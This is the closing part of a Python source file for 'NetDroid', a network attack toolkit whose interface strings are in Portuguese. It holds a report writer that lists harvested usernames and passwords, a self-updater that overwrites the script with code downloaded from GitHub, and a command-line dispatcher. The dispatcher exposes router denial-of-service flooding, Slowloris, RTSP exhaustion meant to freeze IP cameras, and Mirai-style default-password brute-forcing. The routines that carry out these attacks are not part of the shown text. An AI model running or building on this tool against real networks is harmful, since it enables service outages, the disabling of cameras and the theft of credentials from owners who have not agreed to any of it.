            nodes.append(f'<circle cx="{x:.0f}" cy="{y:.0f}" r="8" fill="{color}"/>')
            nodes.append(f'<text x="{x:.0f}" y="{y + 20:.0f}" fill="#888" '
                         f'font-size="10" text-anchor="middle">.{label}</text>')
        gw_node = (f'<circle cx="{cx}" cy="{cy}" r="15" fill="#cc0000" '
                   f'stroke="#ff0000" stroke-width="2"/>'
                   f'<text x="{cx}" y="{cy + 30}" fill="#cc0000" '
                   f'font-size="11" text-anchor="middle">Gateway</text>')
        return (f'<svg width="{w}" height="{h}" xmlns="http://www.w3.org/2000/svg">'
                f'{"".join(nodes)}{gw_node}</svg>')

    def _write_txt(self, path: Path):
        lines = [
            f"{'=' * 60}",
            f"  NetDroid — Resumo Executivo",
            f"  {self.timestamp.strftime('%Y-%m-%d %H:%M')}",
            f"{'=' * 60}",
            f"  SSID:    {self.det.ssid or 'N/A'}",
            f"  Gateway: {self.det.gateway or 'N/A'}",
            f"  Subnet:  {self.det.subnet or 'N/A'}",
            f"  Hosts:   {len(self.hosts)}",
            f"{'─' * 60}",
        ]
        for h in self.hosts:
            gw = " [GATEWAY]" if h.get("is_gateway") else ""
            ports = ", ".join(str(p) for p in h.get("ports", [])[:10])
            lines.append(f"  {h['ip']}{gw}")
            lines.append(f"    MAC: {h.get('mac', 'N/A')} | {h.get('vendor', '?')} | {h.get('os', '?')}")
            if ports:
                lines.append(f"    Ports: {ports}")
            for w in h.get("web_info", []):
                lines.append(f"    Web: {w.get('title', '')} [{w.get('server', '')}]")
        creds = self.god.get("creds", [])
        if creds:
            lines.append(f"\n{'!' * 60}")
            lines.append(f"  CREDENCIAIS ENCONTRADAS:")
            for c in creds:
                lines.append(f"  {c['ip']}:{c['port']} — {c['user']}:{c['password']} ({c.get('vendor','')})")
            lines.append(f"{'!' * 60}")
        lines.append(f"\n{'=' * 60}")
        lines.append(f"  NetDroid v{VERSION}")
        lines.append(f"{'=' * 60}")
        path.write_text("\n".join(lines), encoding="utf-8")


# ═══════════════════ UPGRADER ═════════════════════════════════

class Upgrader:
    """Auto-update from GitHub."""

    def __init__(self, ui: TerminalUI):
        self.ui = ui

    def run(self):
        self.ui.section("AUTO-UPDATE")
        if not HAS_REQUESTS:
            self.ui.error("requests não instalado. pip install requests")
            return
        try:
            self.ui.info(f"Verificando versão remota...")
            resp = requests.get(GITHUB_VERSION_URL, timeout=10)
            if resp.status_code != 200:
                self.ui.error(f"Falha ao buscar versão: HTTP {resp.status_code}")
                return
            remote_version = resp.text.strip()
            self.ui.info(f"Local: {VERSION} | Remota: {remote_version}")
            if remote_version == VERSION:
                self.ui.success("Já está na versão mais recente.")
                return
            if not self.ui.consent(f"Atualizar {VERSION} → {remote_version}?"):
                return
            self.ui.info("Baixando nova versão...")
            resp = requests.get(GITHUB_RAW_URL, timeout=30)
            if resp.status_code != 200:
                self.ui.error(f"Falha no download: HTTP {resp.status_code}")
                return
            script_path = Path(__file__).resolve()
            backup = script_path.with_suffix(".py.bak")
            shutil.copy2(script_path, backup)
            self.ui.success(f"Backup: {backup}")
            script_path.write_text(resp.text, encoding="utf-8")
            self.ui.success(f"Atualizado para v{remote_version}")
        except Exception as e:
            self.ui.error(f"Erro no update: {e}")


# ═══════════════════ MAIN ENTRY ═══════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="NetDroid",
        description="Professional WiFi Network Analysis Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Exemplos:
              python NetDroid.py --auto --discover
              python NetDroid.py --auto --discover --normal
              python NetDroid.py --auto --discover --Insane
              python NetDroid.py --t 192.168.1.5 --Insane
              python NetDroid.py --auto --discover --god
              python NetDroid.py --upgrade
        """))

    # Target
    p.add_argument("--auto", action="store_true",
                   help="Auto-detect gateway/subnet")
    p.add_argument("--t", metavar="TARGET",
                   help="Manual target IP or subnet (e.g. 192.168.1.5 or 192.168.0.0/24)")

    # Discovery
    p.add_argument("--discover", action="store_true",
                   help="Run full host discovery")

    # Scan modes
    p.add_argument("--normal", action="store_true",
                   help="Port scan top 20 ports (balanced)")
    p.add_argument("--Insane", action="store_true",
                   help="Port scan 1-65535 (max speed)")
    p.add_argument("--stealth", action="store_true",
                   help="Port scan top 100 (stealthy, random delays)")
    p.add_argument("--ports", metavar="PORTS",
                   help="Custom ports (comma-separated, e.g. 80,443,8080)")

    # Stress
    p.add_argument("--overfull", action="store_true",
                   help="Heavy stress test (TCP flood + UDP storm + HTTP storm)")
    p.add_argument("--overflow", action="store_true",
                   help="Professional stress with iperf3 metrics")
    p.add_argument("--flood", action="store_true",
                   help="High level DOS attack to the router (infinite packets)")

    # God mode & Advanced Attacks
    p.add_argument("--god", action="store_true",
                   help="Full network interaction (broadcast + NetBIOS + HTTP deep probe)")
    p.add_argument("--slowloris", action="store_true",
                   help="[GOD] HTTP Slowloris attack (Esgota conexões web de IoT)")
    p.add_argument("--rtsp-kill", action="store_true",
                   help="[GOD] RTSP Connection exhaustion (Trava câmeras IP)")
    p.add_argument("--onvif", action="store_true",
                   help="[GOD] ONVIF WS-Discovery (Detecta câmeras IP em multicast)")
    p.add_argument("--mirai", action="store_true",
                   help="[GOD] Mirai botnet brute-force (Telnet/SSH senhas padrão)")

    # Utility
    p.add_argument("--upgrade", action="store_true",
                   help="Auto-update from GitHub")
    p.add_argument("--version", action="store_true",
                   help="Show version")

    return p


async def main_async(args):
    ui = TerminalUI()
    ui.boot_sequence()

    # ── version ───────────────────────────────
    if args.version:
        ui.info(f"NetDroid v{VERSION}")
        return

    # ── upgrade ───────────────────────────────
    if args.upgrade:
        Upgrader(ui).run()
        return

    # ── validate target ───────────────────────
    if not args.auto and not args.t:
        ui.error("Use --auto ou --t <target> para definir o alvo.")
        ui.info("Exemplo: python NetDroid.py --auto --discover")
        return

    has_action = any([args.discover, args.normal, args.Insane, args.stealth,
                      args.ports, args.overfull, args.overflow, args.god,
                      args.flood, args.slowloris, args.rtsp_kill,
                      args.onvif, args.mirai])
    if not has_action:
        ui.error("Nenhuma ação especificada.")
        ui.info("Use: --discover, --normal, --Insane, --stealth, --overfull, --overflow, --god")
        return

    # ── network detection ─────────────────────
    detector = NetworkDetector(ui, target=args.t)
    if not detector.detect():
        return

    hosts: List[Dict[str, Any]] = []
    stress_results: Dict = {}
    god_data: Dict = {}

    # ── discover ──────────────────────────────
    if args.discover:
        discovery = HostDiscovery(ui, detector)
        hosts = await discovery.discover()
        if not hosts:
            ui.warn("Nenhum host encontrado. Operações subsequentes podem falhar.")

    # ── handle single target without discover ─
    if not args.discover and args.t:
        try:
            net = ipaddress.ip_network(args.t, strict=False)
            if net.prefixlen == 32:
                hosts = [{"ip": args.t, "mac": "N/A", "vendor": "N/A",
                          "os": "N/A", "latency_ms": 0, "is_gateway": False,
                          "ports": [], "services": {}}]
            else:
                hosts = [{"ip": str(h), "mac": "N/A", "vendor": "N/A",
                          "os": "N/A", "latency_ms": 0, "is_gateway": False,
                          "ports": [], "services": {}}
                         for h in list(net.hosts())[:254]]
        except ValueError:
            hosts = [{"ip": args.t, "mac": "N/A", "vendor": "N/A",
                      "os": "N/A", "latency_ms": 0, "is_gateway": False,
                      "ports": [], "services": {}}]

    # ── port scan ─────────────────────────────
    scan_mode = None
    if args.normal:
        scan_mode = "normal"
    elif args.Insane:
        scan_mode = "insane"
    elif args.stealth:
        scan_mode = "stealth"
    elif args.ports:
        scan_mode = "normal"

    if scan_mode or args.ports:
        custom = None
        if args.ports:
            custom = [int(p.strip()) for p in args.ports.split(",") if p.strip().isdigit()]
        scanner = PortScanner(ui, mode=scan_mode or "normal",
                              custom_ports=custom, insane=args.Insane)
        hosts = await scanner.scan_all(hosts)

    # ── stress ────────────────────────────────
    if args.overfull or args.overflow or args.flood:
        stress = StressEngine(ui, detector, insane=args.Insane)
        if args.flood:
            await stress.run_flood()
        if args.overfull:
            await stress.run_overfull()
        if args.overflow:
            await stress.run_overflow()
        stress_results = stress.results

    # ── god mode & advanced attacks ───────────────────────
    if args.god or args.slowloris or args.rtsp_kill or args.onvif or args.mirai:
        god = GodMode(ui, detector, hosts)
        
        if args.god:
            # O modo God agora engloba todos os outros
            await god.run()
        else:
            # Execução cirúrgica (apenas o que foi pedido)
            if args.onvif: await god.run_onvif()
            if args.mirai: await god.run_mirai()
            if args.slowloris: await god.run_slowloris()
            if args.rtsp_kill: await god.run_rtsp_kill()
            
        god_data = {
            "creds": god.found_creds,
            "ssdp": god.ssdp_devices,
            "rtsp": god.rtsp_streams,
            "onvif": getattr(god, "onvif_devices", [])
        }

    # ── report ────────────────────────────────
    if not args.flood:
        report = ReportEngine(ui, detector, hosts, stress_results, god_data)
        report.generate()
    else:
        ui.info("Opção --flood ativada. Geração de relatórios ignorada.")

    ui.section("COMPLETE")
    ui.success(f"Execução finalizada em {ui.elapsed()}")
    ui.info(f"Resultados em: {detector.output_dir}/")


def main():
    parser = build_parser()
    args = parser.parse_args()

    # Handle --version without requiring other args
    if args.version:
        try:
            if HAS_RICH:
                Console(force_terminal=True).print(BANNER.format(version=VERSION))
        except Exception:
            pass
        print(f"  NetDroid v{VERSION}")
        return

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n  [!] Interrompido pelo usuário.")
    except Exception as e:
        print(f"\n  [ERROR] {e}")
        traceback.print_exc()


if __name__ == "__main__":
    main()
